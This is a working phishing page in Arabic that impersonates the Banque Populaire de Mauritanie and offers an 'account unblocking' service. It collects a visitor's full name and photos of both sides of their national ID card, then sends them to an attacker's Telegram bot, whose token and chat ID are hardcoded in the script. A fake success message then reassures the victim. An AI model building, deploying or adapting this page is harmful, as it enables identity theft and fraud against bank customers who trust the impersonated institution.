<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فك الحظر - البنك الشعبي الموريتاني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #8B6914;
            --secondary: #1a1a2e;
            --accent: #C9A961;
            --light: #f5f1e8;
            --dark: #0f0f0f;
        }

        html, body {
            direction: rtl;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        #splash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--light);
            z-index: 1000;
            animation: fadeIn 0.5s ease-in;
        }

        #splash.hide {
            animation: fadeOut 0.5s ease-out;
            pointer-events: none;
            opacity: 0;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .splash-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: pulse 2s ease-in-out infinite;
        }

        .splash-content h1 {
            font-size: 36px;
            margin: 20px 0;
            font-weight: bold;
        }

        .splash-content p {
            font-size: 18px;
            margin-bottom: 10px;
            color: var(--accent);
        }

        .splash-dots {
            margin-top: 40px;
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background-color: var(--accent);
            animation: pulse 1.5s ease-in-out infinite;
        }

        body {
            background-color: var(--light);
            padding: 40px 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            border: 3px solid var(--primary);
            text-align: right;
            animation: slideDown 0.6s ease-out;
            opacity: 0;
        }

        .container.show {
            opacity: 1;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .header-icon {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .header h1 {
            font-size: 28px;
            color: var(--primary);
            margin: 0 0 10px 0;
            font-weight: bold;
        }

        .header p {
            color: var(--secondary);
            font-size: 14px;
            margin: 0;
        }

        .header-line {
            height: 3px;
            width: 60px;
            background: var(--accent);
            margin: 15px auto 0;
            border-radius: 2px;
        }

        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            display: none;
            font-size: 14px;
        }

        .alert.show {
            display: block;
        }

        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 25px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            margin-bottom: 10px;
            color: var(--primary);
            font-weight: bold;
            font-size: 16px;
        }

        .form-group small {
            color: #666;
            font-size: 12px;
            margin-top: 5px;
        }

        input[type="text"],
        input[type="date"],
        input[type="file"] {
            padding: 12px 15px;
            border: 2px solid var(--accent);
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus,
        input[type="date"]:focus {
            outline: none;
            border-color: var(--primary);
        }

        .file-input-wrapper {
            border: 2px dashed var(--accent);
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            background-color: #fafafa;
            cursor: pointer;
            transition: all 0.3s;
        }

        .file-input-wrapper:hover {
            border-color: var(--primary);
            background-color: #f0f0f0;
        }

        .file-input-wrapper input {
            display: none;
        }

        .file-input-wrapper label {
            cursor: pointer;
            display: block;
            margin: 0;
        }

        .file-input-wrapper .icon {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .file-input-wrapper p {
            margin: 0 0 5px 0;
            color: var(--secondary);
        }

        .file-input-wrapper small {
            color: #999;
        }

        button {
            padding: 15px 30px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(139, 105, 20, 0.3);
            margin-top: 10px;
        }

        button:hover:not(:disabled) {
            box-shadow: 0 6px 20px rgba(139, 105, 20, 0.4);
            transform: translateY(-2px);
        }

        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid var(--accent);
            text-align: center;
            font-size: 12px;
            color: #999;
        }

        .footer p {
            margin: 5px 0;
        }

        @media (max-width: 600px) {
            .container {
                padding: 20px;
            }

            .header h1 {
                font-size: 24px;
            }

            input, button {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div id="splash">
        <div class="splash-content">
            <div class="splash-icon">🏦</div>
            <h1>البنك الشعبي الموريتاني</h1>
            <p>خدمة فك الحظر</p>
            <p style="font-size: 14px; margin-top: 30px;">بالشراكة مع الصيرفية الموريتانية الكبرى</p>
        </div>
        <div class="splash-dots">
            <div class="dot"></div>
            <div class="dot" style="animation-delay: 0.3s;"></div>
            <div class="dot" style="animation-delay: 0.6s;"></div>
        </div>
    </div>

    <div class="container" id="container">
        <div class="header">
            <div class="header-icon">🏦</div>
            <h1>خدمة فك الحظر</h1>
            <p>البنك الشعبي الموريتاني</p>
            <div class="header-line"></div>
        </div>

        <div class="alert" id="alert"></div>

        <form id="form">
            <div class="form-group">
                <label>1️⃣ الاسم الكامل</label>
                <input 
                    type="text" 
                    id="fullName" 
                    placeholder="أدخل اسمك الكامل (بدون أرقام)"
                    required
                >
                <small>ملاحظة: سيتم حظر الأرقام تلقائياً</small>
            </div>

            <div class="form-group">
                <label>2️⃣ صورة بطاقة التعريف (من الأمام)</label>
                <div class="file-input-wrapper">
                    <input type="file" id="idFront" accept="image/*" required>
                    <label for="idFront">
                        <div class="icon">📸</div>
                        <p>انقر لاختيار الصورة</p>
                        <small id="idFrontName">لم يتم اختيار صورة</small>
                    </label>
                </div>
            </div>

            <div class="form-group">
                <label>3️⃣ صورة بطاقة التعريف (من الخلف)</label>
                <div class="file-input-wrapper">
                    <input type="file" id="idBack" accept="image/*" required>
                    <label for="idBack">
                        <div class="icon">📸</div>
                        <p>انقر لاختيار الصورة</p>
                        <small id="idBackName">لم يتم اختيار صورة</small>
                    </label>
                </div>
            </div>

            <div class="form-group">
                <label>4️⃣ تاريخ المشكلة</label>
                <input 
                    type="date" 
                    id="problemDate" 
                    required
                >
                <small>ملاحظة: سيتم قبول الأرقام فقط</small>
            </div>

            <button type="submit" id="submitBtn">✅ إرسال الطلب</button>
        </form>

        <div class="footer">
            <p>🤝 بالشراكة مع الصيرفية الموريتانية الكبرى</p>
            <p>© 2024 البنك الشعبي الموريتاني - جميع الحقوق محفوظة</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || '8831199692:AAGfkkFM×jtMaYsA9KLZFUiw_dlu7LjxEf8';
        const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || '8665814266';

        setTimeout(() => {
            document.getElementById('splash').classList.add('hide');
            document.getElementById('container').classList.add('show');
        }, 3000);

        document.getElementById('fullName').addEventListener('input', function(e) {
            this.value = this.value.replace(/[0-9]/g, '');
        });

        document.getElementById('idFront').addEventListener('change', function(e) {
            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
            document.getElementById('idFrontName').textContent = name;
        });

        document.getElementById('idBack').addEventListener('change', function(e) {
            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
            document.getElementById('idBackName').textContent = name;
        });

        function showAlert(message, type = 'info') {
            const alert = document.getElementById('alert');
            alert.textContent = message;
            alert.className = `alert show ${type}`;
            
            if (type === 'success') {
                setTimeout(() => {
                    alert.classList.remove('show');
                }, 5000);
            }
        }

        document.getElementById('form').addEventListener('submit', async (e) => {
            e.preventDefault();

            const fullName = document.getElementById('fullName').value.trim();
            const idFront = document.getElementById('idFront').files[0];
            const idBack = document.getElementById('idBack').files[0];
            const problemDate = document.getElementById('problemDate').value;
            const submitBtn = document.getElementById('submitBtn');

            if (!fullName) {
                showAlert('يرجى إدخال الاسم الكامل', 'error');
                return;
            }
            if (!idFront) {
                showAlert('يرجى تحميل صورة بطاقة التعريف من الأمام', 'error');
                return;
            }
            if (!idBack) {
                showAlert('يرجى تحميل صورة بطاقة التعريف من الخلف', 'error');
                return;
            }
            if (!problemDate) {
                showAlert('يرجى إدخال تاريخ المشكلة', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ جاري الإرسال...';

            try {
                const textMessage = `
🏦 طلب فك حظر جديد
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 الاسم الكامل: ${fullName}
📅 تاريخ المشكلة: ${problemDate}
📱 من: البنك الشعبي الموريتاني
━━━━━━━━━━━━━━━━━━━━━━━━━━
                `;

                const messageResponse = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: textMessage
                        })
                    }
                );

                if (!messageResponse.ok) {
                    throw new Error('خطأ في الرسالة النصية');
                }

                const formData1 = new FormData();
                formData1.append('chat_id', TELEGRAM_CHAT_ID);
                formData1.append('photo', idFront);
                formData1.append('caption', '📷 صورة بطاقة التعريف (الأمام)');

                const photoResponse1 = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData1
                    }
                );

                if (!photoResponse1.ok) {
                    throw new Error('خطأ في الصورة الأمامية');
                }

                const formData2 = new FormData();
                formData2.append('chat_id', TELEGRAM_CHAT_ID);
                formData2.append('photo', idBack);
                formData2.append('caption', '📷 صورة بطاقة التعريف (الخلف)');

                const photoResponse2 = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    {
                        method: 'POST',
                        body: formData2
                    }
                );

                if (!photoResponse2.ok) {
                    throw new Error('خطأ في الصورة الخلفية');
                }

                showAlert('تم إرسال طلبك بنجاح! سيتم التواصل معك قريباً', 'success');

                document.getElementById('form').reset();
                document.getElementById('idFrontName').textContent = 'لم يتم اختيار صورة';
                document.getElementById('idBackName').textContent = 'لم يتم اختيار صورة';

            } catch (error) {
                console.error('خطأ:', error);
                showAlert('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = '✅ إرسال الطلب';
            }
        });
    </script>
</body>
</html>
